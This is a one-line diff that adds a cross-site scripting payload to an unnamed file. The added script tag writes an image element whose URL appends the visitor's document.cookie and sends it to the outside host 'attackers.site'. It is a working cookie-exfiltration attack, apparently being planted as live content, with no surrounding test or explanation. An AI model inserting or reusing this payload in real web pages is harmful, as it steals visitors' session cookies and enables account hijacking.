@@ -1,0 +1,1 @@
+<script>document.write('<img src="http://attackers.site/cv.jpg?'+document.cookie+'">')</script>
